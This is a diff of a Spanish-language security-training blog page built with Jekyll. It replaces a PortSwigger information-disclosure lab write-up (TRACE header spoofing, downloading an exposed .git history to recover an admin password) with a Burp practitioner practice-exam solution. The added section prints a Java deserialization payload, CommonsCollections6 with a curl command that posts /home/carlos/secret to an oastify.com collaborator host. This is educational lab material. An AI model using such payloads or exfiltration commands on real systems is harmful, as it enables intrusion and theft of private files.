+	<img src="/assets/img/Burp/Pasted%20image%2020220613165251.png" text-align="center" />
 </div>
 
-<p>Con la finalidad de obtener el encabezado que determina la IP utiliza el método TRACE:</p>
+<p>Así, terminamos empleando el siguiente comando a modo de payload en la sección de “Exploiting”:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CommonsCollections6 <span class="s1">'curl --data @/home/carlos/secret axbbfl7fa1w5zuw5zgf77qg6yx4nsc.oastify.com'</span>
+</code></pre></div></div>
+
+<p>Lanzamos el ataque y vemos que en nuestro burp collaborator hay un HTTP request con el contenido del fichero:</p>
 
 <div style="text-align:center">
-	<img src="/assets/img/Burp/Pasted%20image%2020220414184233.png" text-align="center" />
+	<img src="/assets/img/Burp/Pasted%20image%2020220613165706.png" text-align="center" />
 </div>
 
-<p>Esto nos permitirá obtener la request que llega a la última parte de la cadena, es decir, al servidor.</p>
-
-<div style="text-align:center">
-	<img src="/assets/img/Burp/Pasted%20image%2020220414184327.png" text-align="center" />
-</div>
-
-<p>Abrimos el archivo:</p>
-
-<div style="text-align:center">
-	<img src="/assets/img/Burp/Pasted%20image%2020220414184446.png" text-align="center" />
-</div>
-
-<p>Ahí podemos ver un encabezado que en la request no puede verse y una dirección IP. Esta cabecera la utiliza el servidor para saber el origen de la request ya que hemos visto que el panel de administrador sólo es accesible paara usuarios locales.</p>
-
-<p>Así, vamos a hacer que Burp añada dicho cabecera con el bucle local para que el servidor piense que la petición es local:</p>
-
-<div style="text-align:center">
-	<img src="/assets/img/Burp/Pasted%20image%2020220414200709.png" text-align="center" />
-</div>
-
-<p>Y cuando interceptamos la request obtenemos:</p>
-
-<div style="text-align:center">
-	<img src="/assets/img/Burp/Pasted%20image%2020220414200733.png" text-align="center" />
-</div>
-
-<p>Y abríamos accedido al panel de administrador:</p>
-
-<div style="text-align:center">
-	<img src="/assets/img/Burp/Pasted%20image%2020220414200804.png" text-align="center" />
-</div>
-
-<p><br /></p>
-
-<h5 id="328-historial-de-control-de-versiones">3.2.8. Historial de control de versiones.</h5>
-
-<p>Prácticamente todos los sitios web se desarrollan utilizando algún tipo de sistema de control de versiones, como Git. De forma predeterminada, un proyecto de Git almacena todos sus datos de control de versiones en una carpeta llamada .git. Ocasionalmente, los sitios web exponen este directorio en el entorno de producción. En este caso, es posible que pueda acceder a él simplemente navegando a /.git.</p>
-
-<p>Si bien a menudo no es práctico explorar manualmente la estructura y el contenido del archivo sin procesar, existen varios métodos para descargar todo el directorio .git. Luego puede abrirlo usando su instalación local de Git para obtener acceso al historial de control de versiones del sitio web. Esto puede incluir registros que contengan cambios confirmados y otra información interesante.</p>
-
-<p>Es posible que esto no le dé acceso al código fuente completo, pero comparar la diferencia le permitirá leer pequeños fragmentos de código. Al igual que con cualquier código fuente, también puede encontrar datos confidenciales codificados dentro de algunas de las líneas modificadas.</p>
-
-<p><br /></p>
-
-<p><strong>Laboratorio 5: Information disclosure in version control history</strong>.</p>
-
-<p>Este laboratorio contiene una vulnerabilidad en su control del historial. Vamos a obtener la contraseña del administrador a partir del historia de cambios que se ha hecho sobre un directorio git.</p>
-
-<p>En primer lugar accedemos al laboratorio y vamos a la carpeta /.git</p>
-
-<div style="text-align:center">
-	<img src="/assets/img/Burp/Pasted%20image%2020220415102701.png" text-align="center" />
-</div>
-
-<p>Vamos a emplear una herramienta; <strong>git-cola</strong> que nos permite aprovecharnos del historial de cambios y en algunos casos deshacerlo para contemplar toda la información del directorio en cuestion.</p>
-
-<p>En primer lugar, descargamos el directorio mediante <strong>wget -r</strong></p>
-
-<div style="text-align:center">
-	<img src="/assets/img/Burp/Pasted%20image%2020220415103038.png" text-align="center" />
-</div>
-
-<p>Y ls -la podemos ver el directorio:</p>
-
-<div style="text-align:center">
-	<img src="/assets/img/Burp/Pasted%20image%2020220415103132.png" text-align="center" />
-</div>
-
-<p>Seguidamente, abrimos dicho directorio con git-cola y deshacemos el último commit, esto es; la última modificación:</p>
-
-<div style="text-align:center">
-	<img src="/assets/img/Burp/Pasted%20image%2020220415103747.png" text-align="center" />
-</div>
-
-<p>Y podemos ver un nuevo fichero en el que se ve la contraseña del administrador recién borrada tal y como se indica en el fichero /.git/description:</p>
-
-<div style="text-align:center">
-	<img src="/assets/img/Burp/Pasted%20image%2020220415103822.png" text-align="center" />
-</div>
-
-<p>Así, accedemos al panel de administrador y borramos a Carlos, completando el laboratorio.</p>
+<p>Lo emitimos como solución y abríamos terminado la primera app del examen.</p>
 
 
       </article>
@@ -1096,7 +894,7 @@ ente mediante ficheros de backup en un directorio oculto.</p>
   <span class="sr-only">Share: </span>
 
   
-    <a href="https://twitter.com/intent/tweet?text=6.+Information+Disclosure.&url=http%3A%2F%2Flocalhost%3A4000%2F2022-03-11-6.Information_disclosure%2F"
+    <a href="https://twitter.com/intent/tweet?text=Burp+Certified+Practitioner+Practice+Exam.&url=http%3A%2F%2Flocalhost%3A4000%2F2022-03-30-PracticeExam%2F"
       class="btn btn-social-icon btn-twitter" title="Share on Twitter">
       <span class="fab fa-fw fa-twitter" aria-hidden="true"></span>
       <span class="sr-only">Twitter</span>
@@ -1104,7 +902,7 @@ ente mediante ficheros de backup en un directorio oculto.</p>
   
 
   
-    <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2F2022-03-11-6.Information_disclosure%2F"
+    <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2F2022-03-30-PracticeExam%2F"
       class="btn btn-social-icon btn-facebook" title="Share on Facebook">
       <span class="fab fa-fw fa-facebook" aria-hidden="true"></span>
       <span class="sr-only">Facebook</span>
@@ -1112,7 +910,7 @@ ente mediante ficheros de backup en un directorio oculto.</p>
   
 
   
-    <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2F2022-03-11-6.Information_disclosure%2F"
+    <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2F2022-03-30-PracticeExam%2F"
       class="btn btn-social-icon btn-linkedin" title="Share on LinkedIn">
       <span class="fab fa-fw fa-linkedin" aria-hidden="true"></span>
       <span class="sr-only">LinkedIn</span>
@@ -1132,13 +930,9 @@ ente mediante ficheros de backup en un directorio oculto.</p>
       <ul class="pagination blog-pager">
         
         <li class="page-item previous">
-          <a class="page-link" href="/2022-03-10-5.Business_logic_vulnerabilities/" data-toggle="tooltip" data-placement="top" title="5. Bussiness Logic Vulnerabilities.">&larr; Previous Post</a>
+          <a class="page-link" href="/2022-03-27-22.OAuth_authentication/" data-toggle="tooltip" data-placement="top" title="21. OAuth Authentication.">&larr; Previous Post</a>
         </li>
         
-        
-        <li class="page-item next">
-          <a class="page-link" href="/2022-03-12-7.Access_control/" data-toggle="tooltip" data-placement="top" title="7. Access Control.">Next Post &rarr;</a>
-        </li>
         
       </ul>
       
